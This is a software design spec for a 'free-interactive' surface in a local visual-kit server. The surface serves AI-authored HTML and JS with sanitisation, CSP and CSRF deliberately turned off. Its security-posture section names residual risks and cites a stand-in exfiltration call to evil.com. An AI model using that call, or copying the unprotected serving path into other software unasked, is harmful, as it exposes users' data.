# visual-kit `free-interactive` surface

**Status:** Draft — ready for review
**Author:** George Pilitsoglou
**Date:** 2026-04-19
**Plugin:** `visual-kit` v1.0.0 → v1.1.0

---

## Goal

Let AI-authored HTML + JS run as-is on the local visual-kit server so paidagogos (and any future plugin) can serve interactive pages — sliders, live plots, custom SVG, whatever — without bypassing the server. Match the trust model superpowers' brainstorming companion already ships: localhost-only, no sanitization, no CSP, AI is trusted.

The existing strict surfaces (`lesson`, `outline`, `comparison`, `feedback`, `gallery`, `free`) stay exactly as they are. The new behaviour is **opt-in via a new surface kind**.

---

## Architecture

Add one new surface kind — `free-interactive` — that takes a full HTML document string and writes it straight to the response. The server detects this surface kind in the request handler and bypasses the normal `buildShell` / CSP / CSRF / surface-registry pipeline. Security controls that apply to every response (DNS rebinding host-allowlist, localhost binding) still apply. Auto-reload via SSE is preserved by injecting one small `<script>` tag before `</body>`.

Everything else visual-kit does — validation, registry, Lit rendering, strict CSP, DOMPurify on `free` — is untouched. No surface besides `free-interactive` changes behaviour.

---

## Tech stack

- TypeScript / Node ≥ 20 (existing)
- No new dependencies
- JSON Schema draft 2020-12 for the surface contract (existing pattern)
- Vitest for unit tests (existing)

---

## Scope

**In:**
- New surface kind `free-interactive` with its own JSON schema
- Server-side bypass path that skips `buildShell`, CSP, CSRF, sanitisation
- Minimal SSE auto-reload injection so iteration still feels live
- Unit + e2e tests proving the bypass works and other surfaces are unaffected
- Capabilities endpoint (`/vk/capabilities`) advertises the new surface

**Out (explicit non-goals):**
- Sandboxed iframe isolation — we're matching superpowers exactly. If we want it later, it's a separate change.
- New interactive `vk-*` components (slider, parametric-plot). Tracked as follow-up once we see which shapes repeat.
- Paidagogos skill changes to emit `free-interactive` specs — separate spec, separate plan, follows after this lands.
- Fragment auto-wrap (superpowers' "content fragments vs full documents" dual mode). AI emits full HTML documents only, v1. Can add auto-wrap later if it proves useful.
- Retrofitting existing `free` surface — remains DOMPurify-sanitised. `free-interactive` is the new permissive path.

---

## Surface contract

### JSON Schema (`schemas/surfaces/free-interactive.v1.json`)

```json
{
  "$schema": "https://json-schema.org/draft/2020-12/schema",
  "$id": "vk://schemas/free-interactive.v1.json",
  "title": "FreeInteractiveSurfaceV1",
  "type": "object",
  "required": ["surface", "version", "html"],
  "properties": {
    "surface": { "const": "free-interactive" },
    "version": { "const": 1 },
    "html":  { "type": "string", "maxLength": 500000 },
    "title": { "type": "string", "maxLength": 200 }
  },
  "additionalProperties": false
}
```

- `html` SHOULD be a complete HTML document. Fragments are not rejected by the schema — the browser will still render them — but the author is responsible for supplying a usable page. Fragment auto-wrap is an explicit non-goal for v1.
- `title` is optional and informational — it is NOT injected into the response (the page has its own `<title>`). Kept for future tooling and debugging.
- `maxLength: 500000` (≈ 500 KB) is five times the `free` surface ceiling. Interactive pages bundle more (inline styles, SVG paths, library snippets).

### Example SurfaceSpec

```json
{
  "surface": "free-interactive",
  "version": 1,
  "title": "Parabola explorer",
  "html": "<!DOCTYPE html>\n<html><head><style>…</style></head><body><canvas id=\"c\"></canvas><script>const c=document.getElementById('c');…</script></body></html>"
}
```

The `html` field can contain anything a browser accepts: inline scripts, event handlers, `<svg>`, `<canvas>`, `<iframe>` pointing elsewhere, external stylesheets, etc. Same trust model as superpowers.

---

## Server flow

### Today (unchanged for all existing surfaces)

```
GET /p/{plugin}/{surfaceId}
  → read .{plugin}/content/{surfaceId}.json
  → validate against schema
  → dispatch to surface renderer (returns Lit TemplateResult)
  → renderFragment → buildShell (injects CSP nonce, CSRF, core bundle, SSE script)
  → respond with HTML + strict CSP headers
```

### New path for `free-interactive`

```
GET /p/{plugin}/{surfaceId}
  → read .{plugin}/content/{surfaceId}.json
  → validate against schema
  → if spec.surface === 'free-interactive':
      → injectReloadScript(spec.html)   // inserts <script> before </body>
      → respond 200 with Content-Type: text/html; charset=utf-8
      → NO Content-Security-Policy header
      → securityHeaders() still applies (X-Content-Type-Options, Referrer-Policy, COOP, CORP)
      → return
  → else: existing pipeline
```

### Reload-script injection

```html
<script>
  (function () {
    var es = new EventSource('/events/stream');
    es.onmessage = function (e) { if (e.data === 'refresh') location.reload(); };
  })();
</script>
```

Injected immediately before `</body>` if present; appended otherwise. Written without `nonce` attribute (no CSP → not needed). This preserves paidagogos's existing "edit JSON → browser auto-reloads" UX.

### Headers emitted

| Header | `free-interactive` | Other surfaces (unchanged) |
|---|---|---|
| `Content-Security-Policy` | *(absent)* | strict, nonce-based |
| `Content-Type` | `text/html; charset=utf-8` | same |
| `X-Content-Type-Options: nosniff` | yes | yes |
| `Referrer-Policy: no-referrer` | yes | yes |
| `Cross-Origin-Opener-Policy: same-origin` | yes | yes |
| `Cross-Origin-Resource-Policy: same-origin` | yes | yes |
| `Vary: Origin` | yes | yes |

The host-allowlist check (`isHostAllowed`) runs on every request and covers DNS rebinding defence independently of CSP.

---

## File structure

### New files

| Path | Purpose |
|---|---|
| `plugins/visual-kit/schemas/surfaces/free-interactive.v1.json` | JSON schema |
| `plugins/visual-kit/src/surfaces/free-interactive.ts` | `renderFreeInteractive(spec) → string` and `injectReloadScript(html) → string` — pure functions, no DOM/Lit |
| `plugins/visual-kit/tests/surfaces/free-interactive.test.ts` | Unit tests for schema + injection |
| `plugins/visual-kit/tests/server/free-interactive-serve.test.ts` | e2e test: spawn server, hit endpoint, assert no CSP and script preserved |

### Modified files

| Path | Change |
|---|---|
| `plugins/visual-kit/src/shared/types.ts` | Add `'free-interactive'` to `SurfaceKind` union |
| `plugins/visual-kit/src/render/validate.ts` | Register new schema |
| `plugins/visual-kit/src/server/index.ts` | Add branch in GET `/p/{plugin}/{surfaceId}` handler that detects `spec.surface === 'free-interactive'` and short-circuits `buildShell`. Imports `renderFreeInteractive` + `injectReloadScript`. |
| `plugins/visual-kit/src/server/capabilities.ts` | Advertise `free-interactive` in `/vk/capabilities` output |
| `plugins/visual-kit/package.json` | Bump version `1.0.0` → `1.1.0` (minor: additive surface) |
| `plugins/visual-kit/CHANGELOG.md` | Document new surface and its security posture |
| `plugins/visual-kit/src/surfaces/index.ts` | No change — `free-interactive` is NOT registered in the Lit dispatcher (it never produces a `TemplateResult`). Server short-circuits before dispatch. |

Surface registry deliberately does not gain a renderer entry for `free-interactive` — it would be a lie (the function doesn't return a `TemplateResult`). Routing is done in the server handler instead. This is explicit and grep-findable.

---

## Security posture

**Documented trust model** (copied into `CHANGELOG.md` and the schema's `description`):

> `free-interactive` surfaces serve AI-authored HTML + JS **without any sanitisation or CSP** on a loopback-bound server. The model is: the AI is trusted, localhost is your machine, and you review AI output visually before interacting. This matches how the superpowers brainstorming companion already operates.
>
> **Residual risks** this surface does NOT defend against:
> - A prompt-injected or compromised AI output can exfiltrate via `fetch('https://evil.com/…')`. Only use this surface with content you understand.
> - A malicious page can probe other localhost services on other ports. Don't run unauthenticated dev servers alongside visual-kit while this surface is in use.
> - UI phishing within the served page. Visually review before entering anything sensitive.
>
> If you need defence against these, use structured surfaces (`lesson`, `free`, etc.) or wait for the sandboxed-iframe follow-up (not shipped in v1.1).

**Defences that still apply:**
- Host allowlist (`isHostAllowed`) — DNS rebinding defence
- Loopback binding — external network hosts can't reach the server
- Path traversal protection (`resolveContained`) — can't read specs outside `.{plugin}/content/`
- Schema validation — malformed specs hit the error page, not the renderer

---

## Capabilities advertisement

`GET /vk/capabilities` already returns a JSON document listing surfaces. Add `"free-interactive"` to the surfaces list with a `permissive: true` flag so clients can detect the surface's trust model at runtime.

```json
{
  "version": "1.1.0",
  "surfaces": [
    { "kind": "lesson", "version": 1 },
    { "kind": "outline", "version": 1 },
    …
    { "kind": "free-interactive", "version": 1, "permissive": true }
  ],
  "bundles": [ … ]
}
```

---

## Testing

### Unit — `tests/surfaces/free-interactive.test.ts`

1. `renderFreeInteractive` returns `spec.html` unchanged when `</body>` is absent (appends reload script at end).
2. `renderFreeInteractive` inserts reload script immediately before `</body>` when present.
3. Reload script contains `new EventSource('/events/stream')` and `location.reload()`.
4. Schema validation: valid full-document HTML passes; a bare fragment like `<div>hi</div>` passes (schema deliberately permissive); oversized html (>500 KB) fails; missing `html` field fails; `surface` value other than `"free-interactive"` fails.
5. `free-interactive` schema rejects extra properties.

### e2e — `tests/server/free-interactive-serve.test.ts`

1. Spawn the server against a temp project dir containing `.test/content/demo.json` with a `free-interactive` spec that includes `<script>window.__marker=42</script>`.
2. GET `/p/test/demo` — expect 200, `Content-Type: text/html`, **no `Content-Security-Policy` header**, body contains the raw `<script>` tag verbatim, body contains the reload-script injection.
3. Parallel sanity test: a `lesson` spec at `.test/content/lesson.json` still gets the strict CSP header and goes through `buildShell`. Proves we didn't accidentally widen the hole.

### Regression — existing test suite

All existing `free`, `lesson`, etc. tests must keep passing unchanged. No modifications to the `buildShell` code path.

---

## Rollout

1. Ship as v1.1.0 (minor version). Additive — no breaking change.
2. Update `CHANGELOG.md` with the security disclosure.
3. Paidagogos stays on `~1.0.0` dependency range until a follow-up spec adds `free-interactive` emission. Nothing in paidagogos changes in this spec.
4. No migration needed — existing SurfaceSpecs don't mention `free-interactive`.

---

## Acceptance criteria

- [ ] `free-interactive.v1.json` schema exists and is registered in `validate.ts`
- [ ] `free-interactive` appears in `SurfaceKind` union in `shared/types.ts`
- [ ] Handler in `server/index.ts` short-circuits for `free-interactive` — verified by reading the diff
- [ ] e2e test: GET on a `free-interactive` spec returns inline `<script>` unchanged, **no** `Content-Security-Policy` header
- [ ] e2e test: GET on a `lesson` spec still returns the strict CSP header (regression guard)
- [ ] Reload script is injected before `</body>`
- [ ] `/vk/capabilities` lists `free-interactive` with `permissive: true`
- [ ] `CHANGELOG.md` documents the trust model of this surface explicitly
- [ ] `package.json` bumped to `1.1.0`
- [ ] All existing tests pass unchanged

---

## Open questions

None that block implementation. Flagged for future (not this spec):

- Do we want fragment auto-wrap (superpowers-style)? Not now.
- Do we want iframe sandboxing as an opt-in mode? Not now.
- Do we want a `size-warning` UX in paidagogos if the emitted HTML approaches 500 KB? Handle in paidagogos spec.
